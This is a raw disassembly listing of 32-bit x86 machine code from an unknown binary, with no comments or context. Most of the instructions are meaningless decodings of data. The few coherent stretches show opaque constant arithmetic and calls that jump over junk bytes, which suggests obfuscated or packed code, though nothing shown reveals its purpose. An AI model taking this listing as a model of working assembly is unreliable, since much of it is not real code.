  40dd57:	loopne 0x40dda1
  40dd59:	cmp    al,0xfd
  40dd5b:	ins    DWORD PTR es:[edi],dx
  40dd5c:	mov    dh,0x70
  40dd5e:	inc    ecx
  40dd5f:	push   esp
  40dd60:	xchg   edx,eax
  40dd61:	or     BYTE PTR [edx],bl
  40dd63:	mov    dh,0x96
  40dd65:	push   0xffffffc2
  40dd67:	mov    BYTE PTR [ecx+ebx*2+0x4a1c6d07],cl
  40dd6e:	add    eax,0x9f0f2d0c
  40dd73:	in     al,dx
  40dd74:	and    ch,al
  40dd76:	mov    esi,0x7da37e18
  40dd7b:	jbe    0x40dd82
  40dd7d:	lods   eax,DWORD PTR ds:[esi]
  40dd7e:	mov    esi,0xebdce9ce
  40dd83:	xchg   ebx,eax
  40dd84:	inc    esp
  40dd85:	(bad)  [ebp-0x6e]
  40dd88:	xcrypt-ctr (bad)
  40dd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd8a:	pop    ds
  40dd8b:	sub    al,BYTE PTR [ecx]
  40dd8d:	xchg   edx,eax
  40dd8e:	sub    dl,BYTE PTR [esp+ebx*1]
  40dd91:	adc    al,0x7b
  40dd93:	cmp    esi,ebx
  40dd95:	lea    ebp,ss:[ebx-0x653ab881]
  40dd9c:	mov    WORD PTR [edx],ss
  40dd9e:	fist   WORD PTR [edx+0x13]
  40dda1:	imul   esi,ebx,0xffffff92
  40dda4:	cmp    DWORD PTR [esi+0x681353dd],esp
  40ddaa:	fcmovu st,st(6)
  40ddac:	inc    ecx
  40ddad:	sub    DWORD PTR [edx+ebx*2-0xf],edi
  40ddb1:	fs dec esi
  40ddb3:	mov    dl,0x81
  40ddb5:	xchg   esi,eax
  40ddb6:	stc    
  40ddb7:	jecxz  0x40dd44
  40ddb9:	das    
  40ddba:	pop    esp
  40ddbb:	jno    0x40dddd
  40ddbd:	arpl   WORD PTR [ecx],bp
  40ddbf:	aas    
  40ddc0:	pop    esp
  40ddc1:	inc    esp
  40ddc2:	scas   eax,DWORD PTR es:[edi]
  40ddc3:	xchg   DWORD PTR [eax],ecx
  40ddc5:	vmwrite edi,DWORD PTR [edi-0x7d]
  40ddc9:	inc    eax
  40ddca:	pop    es
  40ddcb:	and    esi,DWORD PTR [edi+0x13]
  40ddce:	add    DWORD PTR [edx+0x23f00d47],0x11502f44
  40ddd8:	jp     0x40dd9c
  40ddda:	xlat   BYTE PTR ds:[ebx]
  40dddb:	dec    esp
  40dddc:	xor    eax,DWORD PTR ds:0x1b16d9c5
  40dde2:	test   eax,0x293877f8
  40dde7:	mov    cl,0x72
  40dde9:	push   eax
  40ddea:	bound  esi,QWORD PTR [edi+edx*8+0x5]
  40ddee:	imul   ebp,DWORD PTR [edx-0x1e],0xffffff93
  40ddf2:	fs add al,0x5a
  40ddf5:	xor    DWORD PTR [ebx+eax*4-0x43],edi
  40ddf9:	sbb    eax,0x23a81abf
  40ddfe:	in     eax,dx
  40ddff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de00:	cmp    eax,0xcb2a06d
  40de05:	mov    al,ds:0xf8590f2f
  40de0a:	push   ss
  40de0b:	aas    
  40de0c:	or     DWORD PTR [esi+0x6c4f4d3b],eax
  40de12:	xor    al,BYTE PTR [eax-0x30]
  40de15:	test   al,0x4a
  40de17:	xchg   ebx,eax
  40de18:	mov    DWORD PTR [edi-0x51ad2d91],edx
  40de1e:	sub    dh,BYTE PTR [ebx]
  40de20:	inc    edi
  40de21:	jmp    DWORD PTR [eax]
  40de23:	stc    
  40de24:	jecxz  0x40de9c
  40de26:	loopne 0x40de18
  40de28:	and    esp,DWORD PTR ds:0x65ed7933
  40de2e:	inc    DWORD PTR [ebp+edx*4-0x341aa95d]
  40de35:	add    BYTE PTR [esp+esi*8-0x2b],al
  40de39:	and    esi,DWORD PTR [esi+esi*1-0x302df776]
  40de40:	retf   
  40de41:	fcomp  DWORD PTR [ebp-0x4430c7ec]
  40de47:	or     edi,edx
  40de49:	mov    cs,WORD PTR [eax+eiz*2]
  40de4c:	stc    
  40de4d:	stos   DWORD PTR es:[edi],eax
  40de4e:	sahf   
  40de4f:	sub    BYTE PTR ds:[edi+0x6b65181c],bh
  40de56:	les    ebx,FWORD PTR [ebx-0x80]
  40de59:	sbb    edi,DWORD PTR [edx-0x36]
  40de5c:	mov    cl,0x8f
  40de5e:	out    dx,al
  40de5f:	dec    ebp
  40de60:	pop    esi
  40de61:	scas   eax,DWORD PTR es:[edi]
  40de62:	loope  0x40de13
  40de64:	ins    DWORD PTR es:[edi],dx
  40de65:	ds inc eax
  40de67:	mov    bl,0x6b
  40de6a:	xchg   esi,ebp
  40de6c:	rol    BYTE PTR [eax+eiz*4-0x54dbf22a],cl
  40de73:	ja     0x40de80
  40de75:	xchg   esp,eax
  40de76:	mov    cl,BYTE PTR [edi]
  40de78:	rcr    BYTE PTR [eax-0x680e2cee],1
  40de7e:	push   ebx
  40de7f:	pop    ebx
  40de80:	ficom  DWORD PTR [ecx+0x51a7acee]
  40de86:	int3   
  40de87:	mov    dh,0xc1
  40de89:	retf   0x4122
  40de8c:	or     bh,BYTE PTR [ecx-0x5af29c30]
  40de92:	js     0x40de43
  40de94:	mov    eax,DWORD PTR [ecx-0x62]
  40de97:	jae    0x40defe
  40de99:	shl    BYTE PTR [ecx],0x0
  40de9c:	jns    0x40deb8
  40de9e:	push   ecx
  40de9f:	push   ss
  40dea0:	bnd call 0x89e54ec
  40dea6:	sar    BYTE PTR [edi],1
  40dea8:	sub    ecx,0x4de845c7
  40deae:	push   edx
  40deaf:	add    BYTE PTR [eax],al
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x422286
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	sahf   
  40df1b:	sub    eax,0xfc169278
  40df20:	mov    esi,0xbec299be
  40df25:	mov    esi,0xdaa1b597
  40df2a:	clc    
  40df2b:	mov    al,0x35
  40df2d:	std    
  40df2e:	cmp    BYTE PTR [edi-0x3d],bl
  40df31:	inc    ebp
  40df32:	add    BYTE PTR [esi-0x5a],0x1b
  40df36:	aaa    
  40df37:	push   esp
  40df38:	repnz jecxz 0x40dee2
  40df3b:	loop   0x40df0f
  40df3d:	sub    ah,bl
  40df3f:	lds    ebx,FWORD PTR [eax]
  40df41:	or     BYTE PTR [eax+esi*8-0x67],dl
  40df45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df46:	or     al,0xd2
  40df48:	(bad)  
  40df49:	cld    
  40df4a:	aam    0x96
  40df4c:	pop    ebx
  40df4d:	addr16 push edi
  40df4f:	data16 mov dh,0xfe
  40df52:	repnz dec ebx
  40df54:	xchg   edx,eax
  40df55:	aad    0x70
  40df57:	xor    eax,0x9f7e1be8
  40df5c:	mov    edi,0x904d0c26
  40df61:	xchg   ebx,eax
  40df62:	jo     0x40df5c
  40df64:	cmp    eax,0x566b6d9e
  40df69:	and    al,0x18
  40df6b:	dec    edx
  40df6c:	rep lods eax,DWORD PTR ds:[esi]
  40df6e:	daa    
  40df6f:	jno    0x40dfba
  40df71:	fsub   DWORD PTR ds:[edi-0x6e634df1]
  40df78:	add    DWORD PTR [ebp-0x19],edi
  40df7b:	push   0x20420b79
  40df80:	jmp    0x40df2e
  40df82:	or     al,0xba
  40df84:	rol    DWORD PTR [edi+ebp*4-0xa],1
  40df88:	mov    cl,BYTE PTR [ebx]
  40df8a:	xor    al,0x1c
  40df8c:	aam    0x94
  40df8e:	aam    0x3e
  40df90:	jp     0x40dfc6
  40df92:	or     DWORD PTR [eax],edx
  40df94:	scas   eax,DWORD PTR es:[edi]
  40df95:	inc    edi
  40df96:	mov    ecx,0xe05ecd59
  40df9b:	retf   
  40df9c:	push   ebx
  40df9d:	clc    
  40df9e:	mov    DWORD PTR [ecx-0x367f611],0xbca17f98
  40dfa8:	lods   eax,DWORD PTR ds:[esi]
  40dfa9:	push   es
  40dfaa:	xchg   esp,eax
  40dfab:	clc    
  40dfac:	call   0xcbc9:0x71ef0787
  40dfb3:	mov    eax,0xb5d436e2
  40dfb8:	pop    ecx
  40dfb9:	rcl    DWORD PTR [edx+0x44],0x56
  40dfbd:	jg     0x40df68
  40dfbf:	jne    0x40df4b
  40dfc1:	mov    edx,0xb02cdfc2
  40dfc6:	test   edx,0xdd6bb846
  40dfcc:	add    DWORD PTR [edx+0x51b3f806],ebx
  40dfd2:	xor    edi,edi
  40dfd4:	and    edx,DWORD PTR [eax*1+0x9f7cb23]
  40dfdb:	pop    es
  40dfdc:	fisttp WORD PTR [eax]
  40dfde:	bound  esi,QWORD PTR [esi+0x3e]
  40dfe1:	pop    ss
  40dfe2:	stos   BYTE PTR es:[edi],al
  40dfe3:	sar    DWORD PTR [eax+0xe6dd31c],1
  40dfe9:	je     0x40dff3
  40dfeb:	sub    BYTE PTR [eax-0x3a],ch
  40dfee:	int3   
  40dfef:	and    al,0xb4
  40dff1:	mov    bh,0x7f
  40dff3:	mov    eax,0x95bc0723
  40dff8:	xchg   ecx,eax
  40dff9:	cwde   
  40dffa:	add    BYTE PTR [ebp+ebp*1-0x73eb1434],dl
  40e001:	das    
  40e002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e003:	aam    0xc6
  40e005:	xchg   BYTE PTR [ebx-0x7900a14c],bh
  40e00b:	sub    DWORD PTR [esp+edx*2-0x36fccd6d],edi
  40e012:	adc    ecx,esp
  40e014:	in     al,0x8b
  40e016:	int    0xd7
  40e018:	mov    esp,DWORD PTR [esi+0x37fd5d6]
  40e01e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e01f:	pop    edi
  40e020:	rcl    DWORD PTR [bx+si+0x68],cl
  40e024:	mov    bl,0x2f
  40e026:	(bad)  
  40e027:	mov    ebx,0xe95753f7
  40e02c:	and    BYTE PTR ds:0xf482a14e,dl
  40e032:	jge    0x40dfd5
  40e034:	aas    
  40e035:	outs   dx,BYTE PTR fs:[esi]
  40e037:	shl    DWORD PTR [edi+0x449abad7],0xf6
  40e03e:	mov    ds:0x2ca2b7f4,al
  40e043:	and    DWORD PTR [eax],ecx
  40e045:	jmp    0x40e03b
  40e047:	out    dx,eax
  40e048:	push   ds
  40e049:	outs   dx,BYTE PTR ds:[esi]
  40e04a:	dec    edx
  40e04b:	push   es
  40e04c:	pop    edi
  40e04d:	inc    edi
  40e04e:	cld    
  40e04f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e050:	nop
  40e051:	jp     0x40dfd8
  40e053:	xor    al,0x12
  40e055:	daa    
  40e056:	jecxz  0x40e029
  40e058:	mov    al,ds:0x7cd4782e
  40e05d:	out    0x21,eax
  40e05f:	add    eax,DWORD PTR [eax+0x21f550c]
  40e065:	ins    BYTE PTR es:[edi],dx
  40e066:	mov    BYTE PTR [edx+0x5a],bl
  40e069:	or     dh,ah
  40e06b:	pusha  
  40e06c:	repz shl DWORD PTR [eax],1
  40e06f:	mov    bh,0x6f
  40e071:	and    al,0xe8
  40e073:	es push esi
  40e075:	jae    0x40e03e
  40e077:	mov    bl,0x28
  40e079:	(bad)  
  40e07b:	sahf   
  40e07c:	mov    eax,DWORD PTR [eax+eax*4]
  40e07f:	mov    eax,0x3b141ad7
  40e084:	dec    edx
  40e085:	adc    eax,DWORD PTR ds:0x68c5b057
  40e08b:	adc    DWORD PTR [eax+0x60],ecx
  40e08e:	pop    edx
  40e08f:	into   
  40e090:	fisttp QWORD PTR gs:[ebx]
  40e094:	mov    dl,0xda
  40e096:	jo     0x40e0be
  40e098:	xor    BYTE PTR [edi+0xa],ch
  40e09b:	ds dec eax
  40e09d:	aad    0x42
  40e09f:	add    edi,edx
  40e0a1:	or     BYTE PTR [ecx],ah
  40e0a3:	cmp    DWORD PTR [esi+0x15],esp
  40e0a6:	sbb    cl,BYTE PTR [ebx]
  40e0a8:	and    DWORD PTR [ecx],esp
  40e0aa:	ret    
  40e0ab:	dec    edx
  40e0ac:	sbb    DWORD PTR [edx+0x653c30e1],ebp
  40e0b2:	jge    0x40e04b
  40e0b4:	add    dl,BYTE PTR [edx]
  40e0b6:	sbb    edi,DWORD PTR [ebp+0x6270c060]
  40e0bc:	jae    0x40e11a
  40e0be:	push   ss
  40e0bf:	cs test eax,0x76b2d630
  40e0c5:	sbb    DWORD PTR [ecx],0xc476c01a
  40e0cb:	psubusb mm4,QWORD PTR [edi]
  40e0ce:	mov    ah,0x1c
  40e0d0:	(bad)  
  40e0d1:	adc    dh,BYTE PTR [ebx]
  40e0d3:	mov    cs,esi
  40e0d5:	xchg   edx,eax
  40e0d6:	scas   al,BYTE PTR es:[edi]
  40e0d7:	mov    esi,0x361618ae
  40e0dc:	xchg   ebp,eax
  40e0dd:	mov    bh,0x0
  40e0df:	sbb    al,BYTE PTR ss:[ebp-0x7e]
  40e0e3:	dec    ebx
  40e0e4:	mov    ah,0xae
  40e0e6:	sar    DWORD PTR [edx-0x7bbe0b68],cl
  40e0ec:	mov    edi,0x153694ac
  40e0f1:	inc    edi
  40e0f2:	xchg   edi,eax
  40e0f3:	popa   
  40e0f4:	adc    DWORD PTR [ebx],eax
  40e0f6:	aas    
  40e0f7:	out    dx,al
  40e0f8:	add    DWORD PTR [esi+0xe],esi
  40e0fb:	js     0x40e117
  40e0fd:	pop    eax
  40e0fe:	jns    0x40e0b5
  40e100:	and    edx,esi
  40e102:	adc    eax,0x4c5cbdf3
  40e107:	out    dx,al
  40e108:	sub    al,0xe4
  40e10a:	jnp    0x40e117
  40e10c:	xchg   esi,eax
  40e10d:	jl     0x40e162
  40e10f:	(bad)  
  40e110:	in     eax,0x26
  40e112:	inc    ebp
  40e113:	jo     0x40e14f
  40e115:	pop    ds
  40e116:	sub    eax,0x4a5cfd00
  40e11b:	cmp    BYTE PTR cs:[edi+0x4caa5a63],ch
  40e122:	inc    esi
  40e123:	sahf   
  40e124:	out    0x75,al
  40e126:	std    
  40e127:	sub    al,0xa6
  40e129:	lahf   
  40e12a:	dec    ecx
  40e12b:	xor    BYTE PTR [ebp-0x76],0x97
  40e12f:	scas   eax,DWORD PTR es:[edi]
  40e130:	push   esi
  40e131:	(bad)  
  40e132:	jge    0x40e0fc
  40e134:	push   ecx
  40e135:	int    0x7e
  40e137:	mov    cl,0x77
  40e139:	inc    edi
  40e13a:	mov    edx,0xb652da08
  40e13f:	pop    ebp
  40e140:	mov    dh,0x58
  40e142:	add    ebx,DWORD PTR [edx+0x42]
  40e145:	mov    ecx,0x5b212ee2
  40e14a:	outs   dx,DWORD PTR ds:[esi]
  40e14b:	dec    edx
  40e14c:	retf   
  40e14d:	mov    ch,0x90
  40e14f:	pop    edx
  40e150:	pop    ds
  40e151:	add    bh,BYTE PTR [ecx+0x72ebe904]
  40e157:	(bad)  [esi+eax*8+0x59]
  40e15b:	add    DWORD PTR [esi+0x29cc292f],edx
  40e161:	sahf   
  40e162:	mov    eax,ds:0x8e6b4a26
  40e167:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e168:	inc    ecx
  40e169:	mov    eax,esp
  40e16b:	add    esp,DWORD PTR [edi-0x4853adf8]
  40e171:	adc    ebp,0x2b7163
  40e177:	fsubr  QWORD PTR [ecx]
  40e179:	adc    DWORD PTR [esp+eiz*2],edi
  40e17c:	add    esp,DWORD PTR [esi]
  40e17e:	pop    ss
  40e17f:	dec    ebx
  40e180:	ins    DWORD PTR es:[edi],dx
  40e181:	test   al,0x1a
  40e183:	mov    ah,0xeb
  40e185:	sar    DWORD PTR [ebx+0x34d86e15],0xe9
  40e18c:	ins    DWORD PTR es:[edi],dx
  40e18d:	lea    ebx,[eax-0x68]
  40e190:	push   cs
  40e191:	pusha  
  40e192:	icebp  
  40e193:	pop    esp
  40e194:	gs jb  0x40e179
  40e197:	pop    edx
  40e198:	mov    DWORD PTR [esi],eax
  40e19a:	mov    DWORD PTR [ebp-0x20],0x3354
  40e1a1:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  40e1a8:	mov    DWORD PTR [ebp-0x18],0x3d36
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	and    al,BYTE PTR [edx+eiz*4-0x70]
  40e1d9:	icebp  
  40e1da:	add    bh,BYTE PTR [esi-0x413d6642]
  40e1e0:	mov    esi,0xc258df87
  40e1e5:	xchg   edi,eax
  40e1e6:	in     al,0xf8
  40e1e8:	fld    DWORD PTR [edx-0xb]
  40e1eb:	xchg   edi,eax
  40e1ec:	push   ecx
  40e1ed:	mov    ds:0xe68e27c,eax
  40e1f2:	jmp    0x100f:0xe1e615f0
  40e1f9:	push   ds
  40e1fa:	jbe    0x40e1e3
  40e1fc:	adc    al,0x84
  40e1fe:	outs   dx,DWORD PTR ds:[esi]
  40e1ff:	outs   dx,DWORD PTR ds:[esi]
  40e200:	add    ch,BYTE PTR [edx-0x64203738]
  40e206:	int3   
  40e207:	push   edi
  40e208:	adc    al,BYTE PTR [ebx+0x28]
  40e20b:	or     eax,0x11686d54
  40e210:	mov    ebx,0x537e60b2
  40e215:	fdiv   st(0),st
  40e217:	jb     0x40e206
  40e219:	jmp    0x8bc32670
  40e21e:	sbb    esi,DWORD PTR [eax]
  40e220:	out    dx,eax
  40e221:	dec    eax
  40e222:	je     0x40e1fd
  40e224:	mov    ecx,DWORD PTR [eax-0x4c]
  40e227:	dec    eax
  40e228:	jne    0x40e266
  40e22a:	(bad)  
  40e22b:	mov    fs,edi
  40e22d:	and    bl,al
  40e22f:	push   ebx
  40e230:	push   esi
  40e231:	retf   0xbf57
  40e234:	xchg   BYTE PTR [ecx],bl
  40e236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e237:	inc    eax
  40e238:	mov    bl,0x6c
  40e23a:	sub    eax,0x6c073b94
  40e23f:	dec    esi
  40e240:	test   BYTE PTR [edx-0x3ff3317b],ah
  40e246:	mov    ecx,0x183b4855
  40e24b:	retf   
  40e24c:	and    DWORD PTR [ebx-0x7615dee8],ebx
  40e252:	adc    eax,0x4073dc9d
  40e257:	mov    esi,0x97ef547
  40e25c:	and    DWORD PTR [ebx],0xc3c800c2
  40e262:	mov    esp,0x3e1a246c
  40e267:	hlt    
  40e268:	add    eax,DWORD PTR [esi-0x39]
  40e26b:	iret   
  40e26c:	retf   0x6b78
  40e26f:	push   es
  40e270:	cmp    DWORD PTR [ecx-0x3e],ecx
  40e273:	pushf  
  40e274:	xchg   edi,eax
  40e275:	dec    esp
  40e276:	jbe    0x40e2f7
  40e278:	push   eax
  40e279:	jl     0x40e280
  40e27b:	popf   
  40e27c:	push   0x72ed0313
  40e281:	cmp    BYTE PTR [edx+0x16],bl
  40e284:	or     DWORD PTR [ebp-0x4c],esi
  40e287:	jl     0x40e20a
  40e289:	cmp    eax,0x40ea8b57
  40e28e:	cmp    al,0x2e
  40e290:	mov    dl,0x3f
  40e292:	pop    ebx
  40e293:	mov    ecx,0x815639cf
  40e298:	ss inc ecx
  40e29a:	test   BYTE PTR [ebp-0x396a64db],ch
  40e2a0:	lods   eax,DWORD PTR ds:[esi]
  40e2a1:	popf   
  40e2a2:	or     esp,DWORD PTR [edi+0x7f]
  40e2a5:	dec    ebx
  40e2a6:	cdq    
  40e2a7:	fistp  QWORD PTR [edi+0x69]
  40e2aa:	loop   0x40e234
  40e2ac:	push   0x42
  40e2ae:	dec    ebx
  40e2af:	cli    
  40e2b0:	out    dx,eax
  40e2b1:	mov    esp,0x7c44a70e
  40e2b6:	and    BYTE PTR [ecx-0xb069169],dl
  40e2bc:	jp     0x40e284
  40e2be:	cmc    
  40e2bf:	jae    0x40e28f
  40e2c1:	mov    edx,0x76068e57
  40e2c6:	dec    ecx
  40e2c7:	icebp  
  40e2c8:	je     0x40e31c
  40e2ca:	repnz sbb DWORD PTR [ebx+eiz*2],0x19
  40e2cf:	loope  0x40e2c8
  40e2d1:	jle    0x40e2c7
  40e2d3:	iret   
  40e2d4:	clc    
  40e2d5:	cmp    BYTE PTR [eax-0x18a581d0],cl
  40e2db:	xchg   edi,eax
  40e2dc:	adc    BYTE PTR [eax+edi*8],ch
  40e2df:	dec    edi
  40e2e0:	xchg   ecx,edi
  40e2e2:	fmul   DWORD PTR [edx]
  40e2e4:	mov    esp,0x4e55d3b3
  40e2e9:	pusha  
  40e2ea:	test   eax,0xa632ca95
  40e2ef:	pop    esi
  40e2f0:	jle    0x40e33b
  40e2f2:	inc    eax
  40e2f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f4:	ror    BYTE PTR [edi+0x7c],0xd6
  40e2f8:	dec    esi
  40e2f9:	jle    0x40e372
  40e2fb:	push   ebp
  40e2fc:	int    0x2
  40e2fe:	sub    BYTE PTR [eax],0xd6
  40e301:	add    esp,DWORD PTR [ebx+edx*8-0x43ec2135]
  40e308:	aas    
  40e309:	int    0xdf
  40e30b:	loope  0x40e339
  40e30d:	aam    0xed
  40e30f:	fcom   DWORD PTR [ebp+0x2d0de1d2]
  40e315:	mov    ch,0x45
  40e317:	mov    dl,0xf3
  40e319:	push   ss
  40e31a:	stos   DWORD PTR es:[edi],eax
  40e31b:	push   es
  40e31c:	push   eax
  40e31d:	sbb    ecx,eax
  40e31f:	add    DWORD PTR [ecx-0x7],ebx
  40e322:	neg    bl
  40e324:	or     eax,0xd16e520a
  40e329:	add    BYTE PTR [ecx-0x3f],ch
  40e32c:	in     eax,0x46
  40e32e:	cmp    eax,0x20ec51c
  40e333:	inc    edi
  40e334:	mov    ecx,0x273e7be3
  40e339:	push   edi
  40e33a:	dec    eax
  40e33b:	pusha  
  40e33c:	ja     0x40e321
  40e33e:	or     DWORD PTR [edi+0x6f3f8300],ebx
  40e344:	xor    eax,0xa19d94c8
  40e349:	mov    eax,0xcb422294
  40e34e:	sub    ebx,DWORD PTR [edi+ebp*4+0x4f]
  40e352:	sbb    ecx,esi
  40e354:	xor    DWORD PTR [edi],ebx
  40e356:	xchg   edi,eax
  40e357:	mov    ebp,0xe4872fff
  40e35c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e35d:	leave  
  40e35e:	xor    esi,DWORD PTR [edx+0x602ee6a1]
  40e364:	mov    ebp,0x8589c739
  40e369:	cmp    eax,0xd140d723
  40e36e:	enter  0xe357,0x52
  40e372:	add    eax,0xcc23cc34
  40e377:	int3   
  40e378:	(bad)  
  40e379:	dec    esi
  40e37a:	call   0x54e9532a
  40e37f:	int3   
  40e380:	push   ss
  40e381:	inc    esp
  40e382:	enter  0x4c2b,0xf2
  40e386:	(bad)
  40e38a:	xchg   edi,eax
  40e38b:	push   es
  40e38c:	cli    
  40e38d:	in     al,dx
  40e38e:	imul   esi,DWORD PTR [ebx-0x426e0e93],0xfffffffc
  40e395:	sub    al,0xd3
  40e397:	push   cs
  40e398:	mov    dh,0x48
  40e39a:	push   esp
  40e39b:	fisub  WORD PTR [esp+edi*2]
  40e39f:	ins    BYTE PTR es:[edi],dx
  40e3a0:	rol    al,0x59
  40e3a3:	or     BYTE PTR [esi-0x40],ah
  40e3a6:	add    esp,DWORD PTR [ecx]
  40e3a8:	fnstsw WORD PTR [eax]
  40e3aa:	cmp    eax,0xf26aef2c
  40e3af:	inc    ecx
  40e3b1:	int3   
  40e3b2:	pop    edi
  40e3b3:	ja     0x40e35b
  40e3b5:	les    eax,FWORD PTR [edi]
  40e3b7:	in     eax,dx
  40e3b8:	mov    ds:0x81cdb3b3,eax
  40e3bd:	jl     0x40e3b7
  40e3bf:	mov    ecx,0xfc538aaf
  40e3c4:	push   0x1c
  40e3c6:	cmp    dl,BYTE PTR [edi+0x3543b261]
  40e3cc:	repnz outs dx,BYTE PTR ds:[esi]
  40e3ce:	xchg   edx,eax
  40e3cf:	sub    ecx,edi
  40e3d1:	out    dx,eax
  40e3d2:	pop    ebp
  40e3d3:	mov    al,0xa1
  40e3d5:	jle    0x40e3f7
  40e3d7:	cld    
  40e3d8:	sub    ebx,ecx
  40e3da:	retf   0x633b
  40e3dd:	xor    eax,0xc25f8f96
  40e3e2:	clc    
  40e3e3:	mov    esp,ebx
  40e3e5:	push   0xffffffcb
  40e3e7:	ret    0x62de
  40e3ea:	cmp    ah,BYTE PTR [ebp+ebp*2-0x1a]
  40e3ee:	dec    esp
  40e3ef:	or     bl,BYTE PTR [eax-0x5da8c272]
  40e3f5:	lea    edi,[esi+0x73]
  40e3f8:	or     edx,ebx
  40e3fa:	inc    esi
  40e3fb:	dec    ecx
  40e3fc:	jmp    FWORD PTR [eax]
  40e3fe:	mov    cl,BYTE PTR [ecx-0x60]
  40e401:	or     al,0xcd
  40e403:	jp     0x40e422
  40e405:	fistp  WORD PTR [edi+0x45]
  40e408:	inc    esi
  40e409:	fistp  DWORD PTR [eax]
  40e40b:	dec    ecx
  40e40c:	icebp  
  40e40d:	pop    eax
  40e40e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e40f:	jge    0x40e3f8
  40e411:	push   cs
  40e412:	jb     0x40e418
  40e414:	xchg   edi,eax
  40e415:	not    BYTE PTR [esi-0x4d761913]
  40e41b:	push   0xffffffdc
  40e41d:	mov    ch,0x6a
  40e41f:	mov    BYTE PTR ss:[ecx],ch
  40e422:	loope  0x40e43e
  40e424:	lahf   
  40e425:	xor    DWORD PTR [esi+0x64],esp
  40e428:	xor    eax,0xce0d82ea
  40e42d:	es scas al,BYTE PTR es:[edi]
  40e42f:	jo     0x40e3db
  40e431:	mov    al,0x0
  40e433:	aaa    
  40e434:	aam    0xaf
  40e436:	ds jg  0x40e446
  40e439:	xor    dl,bh
  40e43b:	cmp    BYTE PTR [ebp+0x2964836f],dh
  40e441:	(bad)  
  40e442:	out    0xc2,eax
  40e444:	(bad)
  40e447:	imul   esp,DWORD PTR ds:0x37f4aa4b,0x612f8114
  40e451:	fcom   st(2)
  40e453:	inc    edi
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x422286
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
